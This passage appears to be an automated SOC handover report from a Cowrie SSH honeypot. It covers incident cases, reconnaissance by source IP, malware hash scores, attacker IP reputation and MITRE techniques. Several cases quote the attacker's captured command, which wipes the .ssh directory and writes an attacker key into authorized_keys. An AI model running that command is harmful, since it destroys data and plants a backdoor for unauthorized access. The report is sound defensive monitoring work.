| `2026-04-25 12:54:46` | `cowrie.client.kex` |
| `2026-04-25 12:54:47` | `cowrie.login.success` |
| `2026-04-25 12:54:47` | `cowrie.session.params` |
| `2026-04-25 12:54:47` | `cowrie.command.input` |
| `2026-04-25 12:54:47` | `cowrie.command.failed` |
| `2026-04-25 12:54:47` | `cowrie.log.closed` |
| `2026-04-25 12:54:47` | `cowrie.session.params` |
| `2026-04-25 12:54:47` | `cowrie.command.input` |
| `2026-04-25 12:54:48` | `cowrie.session.file_download` |
| `2026-04-25 12:54:48` | `cowrie.log.closed` |
| `2026-04-25 12:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7800524795

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]204` |
| **First Seen** | 2026-04-25 12:54 |
| **Last Seen** | 2026-04-25 12:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:54:49` | `cowrie.session.connect` |
| `2026-04-25 12:54:49` | `cowrie.client.version` |
| `2026-04-25 12:54:49` | `cowrie.client.kex` |
| `2026-04-25 12:54:50` | `cowrie.login.success` |
| `2026-04-25 12:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14640684cacb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:55 |
| **Last Seen** | 2026-04-25 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:55:14` | `cowrie.session.connect` |
| `2026-04-25 12:55:14` | `cowrie.client.version` |
| `2026-04-25 12:55:14` | `cowrie.client.kex` |
| `2026-04-25 12:55:14` | `cowrie.login.success` |
| `2026-04-25 12:55:14` | `cowrie.session.params` |
| `2026-04-25 12:55:14` | `cowrie.command.input` |
| `2026-04-25 12:55:14` | `cowrie.command.failed` |
| `2026-04-25 12:55:15` | `cowrie.log.closed` |
| `2026-04-25 12:55:15` | `cowrie.session.params` |
| `2026-04-25 12:55:15` | `cowrie.command.input` |
| `2026-04-25 12:55:15` | `cowrie.session.file_download` |
| `2026-04-25 12:55:15` | `cowrie.log.closed` |
| `2026-04-25 12:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde7f875fb68

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:55 |
| **Last Seen** | 2026-04-25 12:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:55:16` | `cowrie.session.connect` |
| `2026-04-25 12:55:16` | `cowrie.client.version` |
| `2026-04-25 12:55:16` | `cowrie.client.kex` |
| `2026-04-25 12:55:17` | `cowrie.login.success` |
| `2026-04-25 12:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a516ca9a6f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:56 |
| **Last Seen** | 2026-04-25 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:56:11` | `cowrie.session.connect` |
| `2026-04-25 12:56:11` | `cowrie.client.version` |
| `2026-04-25 12:56:11` | `cowrie.client.kex` |
| `2026-04-25 12:56:11` | `cowrie.login.success` |
| `2026-04-25 12:56:11` | `cowrie.session.params` |
| `2026-04-25 12:56:11` | `cowrie.command.input` |
| `2026-04-25 12:56:11` | `cowrie.command.failed` |
| `2026-04-25 12:56:11` | `cowrie.log.closed` |
| `2026-04-25 12:56:11` | `cowrie.session.params` |
| `2026-04-25 12:56:11` | `cowrie.command.input` |
| `2026-04-25 12:56:11` | `cowrie.session.file_download` |
| `2026-04-25 12:56:11` | `cowrie.log.closed` |
| `2026-04-25 12:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc42538eb65

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 12:56 |
| **Last Seen** | 2026-04-25 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 12:56:13` | `cowrie.session.connect` |
| `2026-04-25 12:56:13` | `cowrie.client.version` |
| `2026-04-25 12:56:13` | `cowrie.client.kex` |
| `2026-04-25 12:56:13` | `cowrie.login.success` |
| `2026-04-25 12:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-603b147c551b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 13:00 |
| **Last Seen** | 2026-04-25 13:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:00:12` | `cowrie.session.connect` |
| `2026-04-25 13:00:12` | `cowrie.client.version` |
| `2026-04-25 13:00:12` | `cowrie.client.kex` |
| `2026-04-25 13:00:12` | `cowrie.login.success` |
| `2026-04-25 13:00:13` | `cowrie.session.params` |
| `2026-04-25 13:00:13` | `cowrie.command.input` |
| `2026-04-25 13:00:13` | `cowrie.command.failed` |
| `2026-04-25 13:00:13` | `cowrie.log.closed` |
| `2026-04-25 13:00:13` | `cowrie.session.params` |
| `2026-04-25 13:00:13` | `cowrie.command.input` |
| `2026-04-25 13:00:13` | `cowrie.session.file_download` |
| `2026-04-25 13:00:13` | `cowrie.log.closed` |
| `2026-04-25 13:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d15d8ddff65

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-25 13:00 |
| **Last Seen** | 2026-04-25 13:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 13:00:14` | `cowrie.session.connect` |
| `2026-04-25 13:00:14` | `cowrie.client.version` |
| `2026-04-25 13:00:15` | `cowrie.client.kex` |
| `2026-04-25 13:00:15` | `cowrie.login.success` |
| `2026-04-25 13:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `102.88.137[.]213` | **27** | 2026-04-25 12:22 | 2026-04-25 12:52 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `139.59.112[.]10` | **27** | 2026-04-25 12:26 | 2026-04-25 13:03 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `159.203.181[.]139` | **27** | 2026-04-25 12:10 | 2026-04-25 12:36 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `170.79.37[.]88` | **27** | 2026-04-25 12:25 | 2026-04-25 12:45 | 0m | 27 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.89[.]35` | **26** | 2026-04-25 12:18 | 2026-04-25 12:38 | 39m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.174.238[.]116` | **23** | 2026-04-25 10:58 | 2026-04-25 11:28 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.1[.]18` | **18** | 2026-04-25 11:19 | 2026-04-25 11:36 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.129.187[.]38` | **7** | 2026-04-25 12:07 | 2026-04-25 12:13 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `45.79.181[.]223` | **2** | 2026-04-25 12:49 | 2026-04-25 12:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `117.50.51[.]198` | 1 | 2026-04-25 12:15 | 2026-04-25 12:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.166[.]76` | 1 | 2026-04-25 12:04 | 2026-04-25 12:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.235[.]60` | 1 | 2026-04-25 12:14 | 2026-04-25 12:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.76[.]190` | 1 | 2026-04-25 12:22 | 2026-04-25 12:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.59.7[.]18` | 1 | 2026-04-25 12:17 | 2026-04-25 12:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.102.83[.]35` | 1 | 2026-04-25 12:30 | 2026-04-25 12:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-04-25 12:15 | 2026-04-25 12:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.78.198[.]204` | 1 | 2026-04-25 12:54 | 2026-04-25 12:54 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `54.164.38[.]251` | 1 | 2026-04-25 12:55 | 2026-04-25 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.138.228[.]221` | 1 | 2026-04-25 12:57 | 2026-04-25 12:57 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.102.83[.]35` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 2 |
| `159.203.181[.]139` | US | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `54.164.38[.]251` | US | Amazon Technologies Inc. | **100** ⚠️ | 17 |
| `165.154.1[.]18` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `123.59.7[.]18` | CN | CloudVsp.Inc | **100** ⚠️ | 50 |
| `219.150.93[.]157` | CN | XINXIBAN-LTD. | **100** ⚠️ | 50 |
| `139.59.112[.]10` | SG | DigitalOcean, LLC | **100** ⚠️ | 28 |
| `170.79.37[.]88` | PE | Telefonica del Peru S.A.A. | **100** ⚠️ | 50 |
| `102.88.137[.]213` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `187.174.238[.]116` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 285 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 159 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 98 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 50 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 49 |

---

## 🔕 False Positive Summary (27 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 16 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 319 cases |
| Tool 34  | Credential Extractor        | ✅ 261 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 30 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 27 filtered (8.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 98 priority case(s) shown individually · 19 recon entry/entries in table (9 group(s) consolidating 184 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T13:13:42Z_
